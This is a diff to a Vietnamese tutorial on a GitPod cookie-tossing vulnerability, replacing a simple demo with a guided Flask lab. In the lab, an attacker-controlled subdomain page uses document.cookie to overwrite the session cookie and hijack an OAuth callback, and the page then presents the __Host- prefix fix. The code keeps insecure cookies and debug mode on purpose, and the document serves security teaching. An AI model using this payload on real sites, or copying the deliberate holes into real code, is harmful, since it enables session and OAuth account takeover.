@@ -125,53 +125,408 @@ Lỗ hổng này được báo cáo cho GitPod vào ngày **26/06/2024** và đ�
 2. **Tạo server đơn giản**:
    - Tạo file `server.py` để mô phỏng một ứng dụng web với domain cha, subdomain, một endpoint có lỗ hổng XSS, và một endpoint để kiểm tra ghi đè cookie:
 ```python
-from flask import Flask, request, make_response
-from markupsafe import escape
+from flask import Flask, request, make_response, jsonify
 
 app = Flask(__name__)
 
-# Route cho domain cha (example.com)
+# ==================== CONFIG ====================
+VICTIM_DOMAIN = 'victim.com'
+SUBDOMAIN = 'malicious.victim.com'
+
+# ==================== TRANG CHỨA TẤT CẢ BƯỚC ====================
 @app.route('/')
-def home():
-    response = make_response('Domain cha: example.com - Cookie parent-session đã được thiết lập')
-    response.set_cookie('session', 'parent-session', domain='.example.com', path='/', httponly=True, samesite='Lax')
+def index():
+    """Trang chính chứa tất cả các bước"""
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Demo Cookie Tossing Attack</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; }
+            .step { background: #f5f5f5; padding: 20px; margin: 20px 0; border-left: 5px solid #007cba; }
+            .step h3 { margin-top: 0; }
+            .btn { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px 5px; }
+            .btn.danger { background: #dc3545; }
+            .btn.success { background: #28a745; }
+            .note { background: #fff3cd; padding: 10px; border-left: 5px solid #ffc107; margin: 10px 0; }
+        </style>
+    </head>
+    <body>
+        <h1>🚨 Demo Cookie Tossing Attack</h1>
+        <p>Thực hiện từng bước để hiểu rõ cuộc tấn công</p>
+
+        <div class="step">
+            <h3>BƯỚC 1: Đăng nhập vào ứng dụng chính</h3>
+            <p>Người dùng đăng nhập vào victim.com và nhận cookie session</p>
+            <a class="btn" href="/step1-login">Bắt đầu đăng nhập</a>
+        </div>
+
+        <div class="step">
+            <h3>BƯỚC 2: Truy cập trang subdomain (attacker)</h3>
+            <p>Người dùng click link đến trang khuyến mãi trên subdomain</p>
+            <p class="note">Lưu ý: Phải hoàn thành bước 1 trước</p>
+            <a class="btn" href="/step2-subdomain">Truy cập subdomain</a>
+        </div>
+
+        <div class="step">
+            <h3>BƯỚC 3: Attacker thực hiện Cookie Tossing</h3>
+            <p>Trang subdomain set cookie độc hại cho domain chính</p>
+            <p class="note">Lưu ý: Phải hoàn thành bước 2 trước</p>
+            <a class="btn danger" href="/step3-cookie-tossing">Thực hiện tấn công</a>
+        </div>
+
+        <div class="step">
+            <h3>BƯỚC 4: Người dùng thực hiện OAuth</h3>
+            <p>Người dùng quay lại ứng dụng chính và kết nối OAuth</p>
+            <p class="note">Lưu ý: Phải hoàn thành bước 3 trước</p>
+            <a class="btn" href="/step4-oauth">Kết nối OAuth</a>
+        </div>
+
+        <div class="step">
+            <h3>BƯỚC 5: Kiểm tra kết quả</h3>
+            <p>Xem kết quả tấn công và phiên bản an toàn</p>
+            <a class="btn" href="/step5-result">Xem kết quả</a>
+            <a class="btn success" href="/secure-version">Phiên bản an toàn</a>
+        </div>
+
+        <div class="step">
+            <h3>Kiểm tra cookies hiện tại</h3>
+            <a class="btn" href="/check-cookies">Kiểm tra cookies</a>
+        </div>
+    </body>
+    </html>
+    '''
+
+# ==================== BƯỚC 1: ĐĂNG NHẬP ====================
+@app.route('/step1-login')
+def step1_login():
+    """Bước 1: Đăng nhập vào ứng dụng chính"""
+    response = make_response('''
+    <h1>BƯỚC 1: Đăng nhập vào victim.com</h1>
+    <p>Người dùng đăng nhập và nhận cookie session</p>
+    
+    <form action="/do-login" method="POST">
+        <button type="submit">Đăng nhập</button>
+    </form>
+    
+    <div class="note">
+        <p><strong>Cookie được set:</strong> session=user123</p>
+        <p><strong>VULNERABLE:</strong> Cookie không dùng __Host- prefix</p>
+    </div>
+    
+    <a class="btn" href="/">← Quay lại</a>
+    ''')
     return response
 
-# Route cho subdomain (sub.example.com) - Trang bình thường
-@app.route('/sub')
-def sub():
-    response = make_response('Subdomain: sub.example.com - Cookie attacker-session đã được thiết lập')
-    response.set_cookie('session', 'attacker-session', domain='.example.com', path='/api', httponly=True, samesite='Lax')
+@app.route('/do-login', methods=['POST'])
+def do_login():
+    """Xử lý đăng nhập"""
+    response = make_response('''
+    <h1>✅ Đăng nhập thành công!</h1>
+    <p>Cookie "session=user123" đã được thiết lập</p>
+    
+    <div class="note">
+        <p><strong>ĐIỀU KIỆN 1:</strong> Người dùng đã có session hợp lệ</p>
+        <p><strong>ĐIỀU KIỆN 2:</strong> Cookie không an toàn (không có __Host- prefix)</p>
+    </div>
+    
+    <a class="btn" href="/step2-subdomain">Tiếp tục BƯỚC 2 →</a>
+    <a class="btn" href="/">Quay lại trang chính</a>
+    ''')
+    
+    # VULNERABLE: Cookie không an toàn
+    response.set_cookie('session', 'user123', 
+                       domain=VICTIM_DOMAIN,
+                       path='/', 
+                       httponly=False)
     return response
 
-# Route mô phỏng lỗ hổng XSS trên subdomain
-@app.route('/sub/xss')
-def xss():
-    user_input = request.args.get('input', '')
-    # Lỗ hổng XSS: hiển thị input mà không mã hóa đầy đủ
-    response = make_response(f'Subdomain: sub.example.com - Input: {user_input}')
+# ==================== BƯỚC 2: TRUY CẬP SUBDOMAIN ====================
+@app.route('/step2-subdomain')
+def step2_subdomain():
+    """Bước 2: Truy cập subdomain của attacker"""
+    session = request.cookies.get('session')
+    if not session:
+        return '''
+        <h1>❌ Chưa đăng nhập</h1>
+        <p>Vui lòng đăng nhập trước khi truy cập subdomain</p>
+        <a class="btn" href="/step1-login">Đăng nhập ngay</a>
+        '''
+    
+    return f'''
+    <h1>BƯỚC 2: Truy cập subdomain {SUBDOMAIN}</h1>
+    <p>Người dùng click link đến trang "khuyến mãi" trên subdomain</p>
+    
+    <div class="note">
+        <p><strong>Session hiện tại:</strong> {session}</p>
+        <p><strong>ĐIỀU KIỆN 3:</strong> Attacker kiểm soát subdomain</p>
+    </div>
+    
+    <a class="btn danger" href="http://{SUBDOMAIN}:5000/step3-cookie-tossing" target="_blank">
+        Truy cập trang khuyến mãi (subdomain) →
+    </a>
+    
+    <p><em>Trang sẽ mở trong tab mới. Sau khi thực hiện tấn công, quay lại tab này.</em></p>
+    
+    <a class="btn" href="/">← Quay lại</a>
+    '''
+
+# ==================== BƯỚC 3: COOKIE TOSSING TRÊN SUBDOMAIN ====================
+@app.route('/step3-cookie-tossing')
+def step3_cookie_tossing():
+    """Bước 3: Attacker thực hiện Cookie Tossing từ subdomain"""
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Trang Khuyến Mãi - {SUBDOMAIN}</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 40px; }}
+            .btn {{ background: #dc3545; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }}
+            .warning {{ background: #f8d7da; padding: 15px; border-left: 5px solid #dc3545; }}
+        </style>
+    </head>
+    <body>
+        <h1>🎁 Trang Khuyến Mãi Đặc Biệt</h1>
+        <p>Chào mừng bạn đến với <strong>{SUBDOMAIN}</strong></p>
+        
+        <div class="warning">
+            <h3>🚨 ATTACKER CONTROLLED PAGE</h3>
+            <p>Trang này được kiểm soát bởi attacker để thực hiện Cookie Tossing</p>
+        </div>
+        
+        <p>Nhấn nút bên dưới để nhận quà tặng đặc biệt:</p>
+        
+        <button onclick="performCookieTossing()">🎯 Nhận Quà Tặng Miễn Phí</button>
+        
+        <script>
+            function performCookieTossing() {{
+                // ✅ ĐIỀU KIỆN 4: Chạy JavaScript trên subdomain
+                // ✅ ĐIỀU KIỆN 5: Set cookie cho domain cha
+                document.cookie = "session=attacker456; domain={VICTIM_DOMAIN}; path=/";
+                
+                alert("✅ Đã nhận quà tặng!\\\\n\\\\nCookie attacker đã được set: session=attacker456\\\\nCho domain: {VICTIM_DOMAIN}");
+                
+                // Quay lại ứng dụng chính
+                window.opener = null;
+                window.open('http://{VICTIM_DOMAIN}:5000/step4-oauth', '_blank');
+            }}
+        </script>
+        
+        <div class="warning">
+            <p><strong>Kỹ thuật Cookie Tossing:</strong></p>
+            <ul>
+                <li>Subdomain set cookie cho domain cha</li>
+                <li>Cookie có cùng tên "session" nhưng giá trị của attacker</li>
+                <li>Trình duyệt sẽ gửi cookie attacker thay vì cookie thật</li>
+            </ul>
+        </div>
+    </body>
+    </html>
+    '''
+
+# ==================== BƯỚC 4: THỰC HIỆN OAUTH ====================
+@app.route('/step4-oauth')
+def step4_oauth():
+    """Bước 4: Người dùng thực hiện kết nối OAuth"""
+    session = request.cookies.get('session')
+    
+    if not session:
+        return '''
+        <h1>❌ Không có session</h1>
+        <p>Vui lòng đăng nhập trước</p>
+        <a class="btn" href="/step1-login">Đăng nhập</a>
+        '''
+    
+    return f'''
+    <h1>BƯỚC 4: Kết nối OAuth với GitHub</h1>
+    <p>Người dùng thực hiện kết nối OAuth sau khi nhận "quà tặng"</p>
+    
+    <div class="note">
+        <p><strong>Session hiện tại:</strong> {session}</p>
+        <p><strong>ĐIỀU KIỆN 6:</strong> Endpoint OAuth chỉ kiểm tra cookie</p>
+    </div>
+    
+    <a class="btn danger" href="/oauth-callback?code=github_auth_code">
+        Kết nối OAuth với GitHub →
+    </a>
+    
+    <a class="btn" href="/">← Quay lại</a>
+    '''
+
+# ==================== BƯỚC 5: KẾT QUẢ ====================
+@app.route('/oauth-callback')
+def oauth_callback():
+    """Endpoint OAuth callback - bị tấn công"""
+    session = request.cookies.get('session')
+    
+    if session == 'attacker456':
+        result = '''
+        <div style="background: #f8d7da; padding: 20px; border: 2px solid #dc3545;">
+            <h1>❌ OAuth BỊ HIJACKED!</h1>
+            <p><strong>Tài khoản GitHub đã kết nối với ATTACKER!</strong></p>
+            <p>Session attacker: <strong>attacker456</strong></p>
+            <p>Kẻ tấn công đã chiếm quyền điều khiển OAuth flow thành công!</p>
+        </div>
+        '''
+    elif session == 'user123':
+        result = '''
+        <div style="background: #d1ecf1; padding: 20px; border: 2px solid #0c5460;">
+            <h1>✅ OAuth Thành công</h1>
+            <p>Tài khoản GitHub đã kết nối với USER thật</p>
+            <p>Session user: <strong>user123</strong></p>
+        </div>
+        '''
+    else:
+        result = f'<h1>Session không xác định: {session}</h1>'
+    
+    return f'''
+    <h1>BƯỚC 5: Kết quả OAuth Callback</h1>
+    {result}
+    
+    <div class="note">
+        <h3>Phân tích kết quả:</h3>
+        <p>Endpoint /oauth-callback chỉ kiểm tra cookie session mà không có:</p>
+        <ul>
+         
+            <li>❌ Additional authentication checks</li>
+            <li>❌ Cookie prefix protection</li>
+        </ul>
+    </div>
+    
+    <a class="btn" href="/step5-result">Xem tổng kết →</a>
+    <a class="btn" href="/">← Quay lại</a>
+    '''
+
+@app.route('/step5-result')
+def step5_result():
+    """Tổng kết kết quả"""
+    return '''
+    <h1>🎯 TỔNG KẾT COOKIE TOSSING ATTACK</h1>
+    
+    <div style="background: #fff3cd; padding: 20px; margin: 20px 0;">
+        <h3>✅ TẤT CẢ 6 ĐIỀU KIỆN ĐƯỢC ĐÁP ỨNG:</h3>
+        <ol>
+            <li><strong>Người dùng có session</strong> - Đã đăng nhập trên victim.com</li>
+            <li><strong>Cookie không an toàn</strong> - Không dùng __Host- prefix</li>
+            <li><strong>Attacker kiểm soát subdomain</strong> - malicious.victim.com</li>
+            <li><strong>Chạy JavaScript trên subdomain</strong> - document.cookie</li>
+            <li><strong>Set cookie cho domain cha</strong> - Domain=victim.com</li>
+            <li><strong>Endpoint nhạy cảm chỉ dùng cookie</strong> - /oauth-callback</li>
+        </ol>
+    </div>
+    
+    <a class="btn success" href="/secure-version">Xem phiên bản an toàn →</a>
+    <a class="btn" href="/">Bắt đầu lại</a>
+    '''
+
+# ==================== PHIÊN BẢN AN TOÀN ====================
+@app.route('/secure-version')
+def secure_version():
+    """Phiên bản an toàn với __Host- prefix"""
+    return '''
+    <h1>🛡️ Phiên bản an toàn với __Host- Cookie Prefix</h1>
+    
+    <div style="background: #d4edda; padding: 20px; margin: 20px 0;">
+        <h3>Cách phòng chống Cookie Tossing:</h3>
+        <p>Sử dụng <strong>__Host-</strong> cookie prefix:</p>
+        <ul>
+            <li>✅ Cookie chỉ được set từ exact domain</li>
+            <li>✅ Không thể set từ subdomain</li>
+            <li>✅ Phải có Secure flag (trong production)</li>
+            <li>✅ Phải có Path=/</li>
+            <li>✅ Không có Domain attribute</li>
+        </ul>
+    </div>
+    
+    <a class="btn" href="/secure-login">Đăng nhập phiên bản an toàn</a>
+    <a class="btn" href="/">← Quay lại demo</a>
+    '''
+
+@app.route('/secure-login')
+def secure_login():
+    """Đăng nhập phiên bản an toàn"""
+    response = make_response('''
+    <h1>✅ Đăng nhập an toàn thành công</h1>
+    
+    <div style="background: #d4edda; padding: 15px;">
+        <p><strong>Cookie an toàn được set:</strong> __Host-session=user123_secure</p>
+        <p><strong>Bảo vệ:</strong> __Host- prefix ngăn chặn Cookie Tossing</p>
+    </div>
+    
+    <div style="background: #fff3cd; padding: 15px; margin: 15px 0;">
+        <h3>⚠️ LƯU Ý DEMO:</h3>
+        <p>Trong môi trường production với HTTPS, __Host- prefix sẽ được browser enforced.</p>
+        <p>Demo này chạy HTTP nên prefix chủ yếu để minh họa concept.</p>
+    </div>
+    
+    <div style="background: #d1ecf1; padding: 15px; margin: 15px 0;">
+        <h3>🔒 COOKIE AN TOÀN:</h3>
+        <ul>
+            <li>Tên: <strong>__Host-session</strong> (có prefix)</li>
+            <li>Giá trị: <strong>user123_secure</strong></li>
+            <li>Domain: <strong>Không có attribute</strong> (chỉ victim.com)</li>
+            <li>Path: <strong>/</strong></li>
+            <li>Secure: <strong>True</strong> (trong production)</li>
+        </ul>
+    </div>
+    
+    <p>Cookie này <strong>KHÔNG THỂ</strong> bị ghi đè từ subdomain!</p>
+    
+    <a class="btn" href="/secure-attack-test">Thử tấn công →</a>
+    <a class="btn" href="/secure-demo">← Quay lại</a>
+    ''')
+    
+    # SECURE: Dùng __Host- prefix 
+    # Trong production phải có secure=True, nhưng demo HTTP tạm dùng secure=False
+    response.set_cookie('__Host-session', 'user123_secure',
+                       path='/',
+                       secure=False,  # Trong demo HTTP tạm dùng False
+                       httponly=True,
+                       samesite='Lax')
     return response
 
-# Route kiểm tra ghi đè với cùng Path=/
-@app.route('/sub/override')
-def override():
-    response = make_response('Subdomain: sub.example.com - Cookie override-session đã được thiết lập với Path=/')
-    response.set_cookie('session', 'override-session', domain='.example.com', path='/', httponly=True, samesite='Lax')
-    return response
-
-# Route mô phỏng API endpoint
-@app.route('/api')
-def api():
-    session = request.cookies.get('session', 'Không có session')
-    return f'API endpoint, session: {session}'
-
-# Route kiểm tra cookie cho domain cha
-@app.route('/check')
-def check():
-    session = request.cookies.get('session', 'Không có session')
-    return f'Check endpoint, session: {session}'
+@app.route('/secure-oauth')
+def secure_oauth():
+    """OAuth phiên bản an toàn"""
+    session = request.cookies.get('__Host-session')
+    return f'''
+    <h1>🛡️ OAuth an toàn</h1>
+    <p>Session an toàn: <strong>{session}</strong></p>
+    <p>Cookie với __Host- prefix không thể bị ghi đè từ subdomain</p>
+    
+    <div style="background: #d4edda; padding: 15px;">
+        <p>✅ OAuth flow được bảo vệ khỏi Cookie Tossing</p>
+        <p>✅ Session không thể bị attacker chiếm đoạt</p>
+        <p>✅ __Host- prefix ngăn subdomain set cookie cùng tên</p>
+    </div>
+    
+    <a class="btn" href="/secure-demo">← Quay lại demo an toàn</a>
+    '''
+# ==================== KIỂM TRA COOKIES ====================
+@app.route('/check-cookies')
+def check_cookies():
+    """Kiểm tra cookies hiện tại"""
+    cookies = dict(request.cookies)
+    return jsonify({
+        'current_domain': request.host,
+        'cookies': cookies,
+        'message': 'Cookies hiện tại'
+    })
 
 if __name__ == '__main__':
+    print(f"""
+🚨 DEMO COOKIE TOSSING ATTACK - TỪNG BƯỚC 🚨
+
+URL chính: http://{VICTIM_DOMAIN}:5000/
+
+CÁC BƯỚC THỰC HIỆN:
+1. Đăng nhập → 2. Truy cập subdomain → 3. Cookie Tossing → 4. OAuth → 5. Kết quả
+
+Chạy với: python app.py
+    """)
+    
     app.run(host='0.0.0.0', port=5000, debug=True)
 ```
 
